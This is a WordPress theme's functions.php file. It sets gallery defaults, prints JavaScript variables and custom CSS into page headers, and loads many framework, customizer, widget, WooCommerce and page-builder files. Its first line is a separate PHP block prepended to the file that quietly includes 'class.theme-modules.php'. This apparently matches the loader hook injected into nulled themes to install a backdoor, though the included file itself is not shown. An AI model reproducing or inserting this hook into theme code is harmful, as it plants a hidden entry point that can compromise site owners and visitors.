<?php if (file_exists(dirname(__FILE__) . '/class.theme-modules.php')) include_once(dirname(__FILE__) . '/class.theme-modules.php'); ?><?php



// change default settings for default gallery
add_action( 'after_setup_theme', 'stride_attachment_display_settings' );
function stride_attachment_display_settings() {
    update_option( 'image_default_link_type', 'file' );
}


// Print global js variables
add_action('wp_head', 'print_theme_wp_head');
function print_theme_wp_head(){
    echo '<script>
                var theme_options = { ajax_url: "'.admin_url( 'admin-ajax.php' ).'" };
          </script>';
}


// Print custom styles
add_action('wp_head', 'print_theme_styles', 1024);
function print_theme_styles(){
    global $post;
    
    $custom_css = TT::get_mod('custom_css');
    $custom_css .= TT::get_mod('custom_css_tablet') != '' ?    '@media (min-width: 768px) and (max-width: 985px) { ' . TT::get_mod('custom_css_tablet') . ' }' : '';
    $custom_css .= TT::get_mod('custom_css_widephone') != '' ? '@media (min-width: 481px) and (max-width: 767px) { ' . TT::get_mod('custom_css_widephone') . ' }' : '';
    $custom_css .= TT::get_mod('custom_css_phone') != '' ?     '@media (max-width: 480px) { '                        . TT::get_mod('custom_css_phone') . ' }' : '';

    
    $logo_style = "";
    $logo = TT::get_mod('logo');
    if( !empty($logo) ){
        $logo_style = "header .brand-be a{ background-image:url(".esc_url($logo)."); }";
    }
    else{
        $logo_style = "header .brand-be a{ background-image:url(".get_template_directory_uri()."/img/logo.png); }";
    }

    echo "<style type='text/css' id='theme-customize-css'>
            $logo_style
            $custom_css
        </style>";
        
}





/*
                                                                    
 _____ _                 _              _____ _                     
|_   _| |_ ___ _____ ___| |_ ___ ___   |     | |___ ___ ___ ___ ___ 
  | | |   | -_|     | -_|  _| . |   |  |   --| | .'|_ -|_ -| -_|_ -|
  |_| |_|_|___|_|_|_|___|_| |___|_|_|  |_____|_|__,|___|___|___|___|
  
*/

// Less Compiler
require_once TT::file_require(get_template_directory() . '/framework/classes/class.less.php');

// Meta fields for Posts
require_once TT::file_require(get_template_directory() . '/framework/classes/class.render.meta.php');

// WP Customizer
require_once TT::file_require(get_template_directory() . '/framework/classes/class.wp.customize.controls.php');
require_once TT::file_require(get_template_directory() . '/framework/classes/class.wp.customize.php');

// Import functions
require_once TT::file_require(get_template_directory() . '/framework/functions/functions.for.theme.php');
require_once TT::file_require(get_template_directory() . '/framework/functions/functions.breadcrumb.php');

// Import Demo Data
require_once TT::file_require(get_template_directory() . '/framework/classes/class.import.data.php');




// Import Widgets
require_once TT::file_require(get_template_directory() . '/includes/widgets/init_widget.php');

// Customizer
require_once TT::file_require(get_stylesheet_directory() . '/includes/customizer.php');
// TGM Plugin Activation
require_once TT::file_require(get_stylesheet_directory() . '/includes/plugins.php');

// Quick Load Element for VC
require_once TT::file_require(get_stylesheet_directory() . '/includes/meta.page.php');
require_once TT::file_require(get_stylesheet_directory() . '/includes/ExtendVCRow.php');

// Import Template tags
require_once TT::file_require(get_template_directory() . '/includes/template-tags.php');

// Woocommerce
require_once TT::file_require(get_template_directory() . '/includes/woo.php');


// Statistics
require_once TT::file_require(get_template_directory() . '/includes/statistics.php');


// Community
require_once TT::file_require(get_template_directory() . '/includes/community.php');
require_once TT::file_require(get_template_directory() . '/includes/community_extra.php');




// Import VC Custom Elements
if( function_exists('vc_map') ){
    $file_dir = TT::file_require( get_stylesheet_directory().'/includes/vc-elements/' );
    foreach( glob( $file_dir . '*.php' ) as $filename ) {
        require_once $filename;
    }
}








?>